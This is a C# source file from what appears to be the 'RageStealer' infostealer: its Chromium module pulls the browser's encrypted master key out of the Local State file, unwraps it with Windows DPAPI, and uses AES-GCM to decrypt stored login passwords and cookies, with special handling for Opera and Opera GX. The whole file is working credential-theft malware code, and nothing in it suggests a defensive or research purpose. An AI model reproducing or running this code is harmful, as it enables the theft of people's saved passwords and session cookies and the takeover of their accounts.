using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using RageStealer.Helper;
using RageStealer.Helper.Bound;

namespace RageStealer.Target.Browsers.Chromium;

public sealed class Crypto
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct CryptprotectPromptstruct
	{
		public int cbSize;

		public int dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct DataBlob
	{
		public int cbData;

		public IntPtr pbData;
	}

	private static string _sPrevBrowserPath = "";

	private static byte[] _sPrevMasterKey = new byte[0];

	private const int macBitSize = 128;

	private const int nonceBitSize = 96;

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

	public static byte[] DpapiDecrypt(byte[] bCipher, byte[] bEntropy = null)
	{
		DataBlob pPlainText = default(DataBlob);
		DataBlob pCipherText = default(DataBlob);
		DataBlob pEntropy = default(DataBlob);
		CryptprotectPromptstruct cryptprotectPromptstruct = default(CryptprotectPromptstruct);
		cryptprotectPromptstruct.cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct));
		cryptprotectPromptstruct.dwPromptFlags = 0;
		cryptprotectPromptstruct.hwndApp = IntPtr.Zero;
		cryptprotectPromptstruct.szPrompt = null;
		CryptprotectPromptstruct pPrompt = cryptprotectPromptstruct;
		string pszDescription = string.Empty;
		try
		{
			try
			{
				if (bCipher == null)
				{
					bCipher = new byte[0];
				}
				pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
				pCipherText.cbData = bCipher.Length;
				Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);
			}
			catch
			{
			}
			try
			{
				if (bEntropy == null)
				{
					bEntropy = new byte[0];
				}
				pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
				pEntropy.cbData = bEntropy.Length;
				Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);
			}
			catch
			{
			}
			CryptUnprotectData(ref pCipherText, ref pszDescription, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
			byte[] array = new byte[pPlainText.cbData];
			Marshal.Copy(pPlainText.pbData, array, 0, pPlainText.cbData);
			return array;
		}
		catch
		{
		}
		finally
		{
			if (pPlainText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pPlainText.pbData);
			}
			if (pCipherText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pCipherText.pbData);
			}
			if (pEntropy.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pEntropy.pbData);
			}
		}
		return new byte[0];
	}

	public static byte[] GetMasterKey(string sLocalStateFolder)
	{
		string text = sLocalStateFolder;
		text += "\\Local State";
		byte[] array = new byte[0];
		if (!File.Exists(text))
		{
			return null;
		}
		if (text != _sPrevBrowserPath)
		{
			_sPrevBrowserPath = text;
			foreach (Match item in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text)))
			{
				if (item.Success)
				{
					array = Convert.FromBase64String(item.Groups[1].Value);
				}
			}
			byte[] array2 = new byte[array.Length - 5];
			Array.Copy(array, 5, array2, 0, array.Length - 5);
			try
			{
				_sPrevMasterKey = DpapiDecrypt(array2);
				return _sPrevMasterKey;
			}
			catch
			{
				return null;
			}
		}
		return _sPrevMasterKey;
	}

	public static string GetUtf8(string sNonUtf8)
	{
		try
		{
			byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
			return Encoding.UTF8.GetString(bytes);
		}
		catch
		{
			return sNonUtf8;
		}
	}

	public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
	{
		byte[] array = new byte[12];
		Array.Copy(bEncryptedData, 3, array, 0, 12);
		try
		{
			byte[] array2 = new byte[bEncryptedData.Length - 15];
			Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
			byte[] array3 = new byte[16];
			byte[] array4 = new byte[array2.Length - array3.Length];
			Array.Copy(array2, array2.Length - 16, array3, 0, 16);
			Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
			return new CAesGcm().Decrypt(bMasterKey, array, null, array4, array3);
		}
		catch
		{
			return null;
		}
	}

	public static string EasyDecrypt(string sLoginData, string sPassword)
	{
		try
		{
			if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
			{
				byte[] masterKey = GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
				return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
			}
			return Encoding.Default.GetString(DpapiDecrypt(Encoding.Default.GetBytes(sPassword)));
		}
		catch
		{
			try
			{
				return CookiesDecrypt(sLoginData, sPassword);
			}
			catch
			{
			}
		}
		return "Dont Decrypt";
	}

	public static string CookiesDecrypt(string sLoginData, string encrypted_value)
	{
		if (encrypted_value.StartsWith("v10") || encrypted_value.StartsWith("v11"))
		{
			byte[] array = new byte[0];
			array = ((sLoginData.Contains("Opera GX Stable") || sLoginData.Contains("Opera Stable")) ? ((!sLoginData.Contains("\\Network\\Cookies")) ? GetMasterKey(Directory.GetParent(sLoginData).FullName) : GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName)) : ((!sLoginData.Contains("\\Network\\Cookies")) ? GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName) : GetMasterKey(Directory.GetParent(sLoginData).Parent.Parent.FullName)));
			GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
			byte[] bytes = Encoding.Default.GetBytes(encrypted_value);
			BinaryReader binaryReader = new BinaryReader(new MemoryStream(bytes));
			binaryReader.ReadBytes(3);
			AeadParameters parameters = new AeadParameters(nonce: binaryReader.ReadBytes(12), key: new KeyParameter(array), macSize: 128);
			gcmBlockCipher.Init(forEncryption: false, parameters);
			byte[] array2 = binaryReader.ReadBytes(bytes.Length);
			byte[] array3 = new byte[gcmBlockCipher.GetOutputSize(array2.Length)];
			int outOff = gcmBlockCipher.ProcessBytes(array2, 0, array2.Length, array3, 0);
			gcmBlockCipher.DoFinal(array3, outOff);
			return Encoding.Default.GetString(array3);
		}
		return Encoding.Default.GetString(DpapiDecrypt(Encoding.Default.GetBytes(encrypted_value)));
	}

	public static string BrowserPathToAppName(string sLoginData)
	{
		if (sLoginData.Contains("Opera GX"))
		{
			return "Opera GX";
		}
		if (sLoginData.Contains("Opera"))
		{
			return "Opera";
		}
		return sLoginData.Replace(Paths.Lappdata, "").Split(new char[1] { '\\' })[1];
	}
}
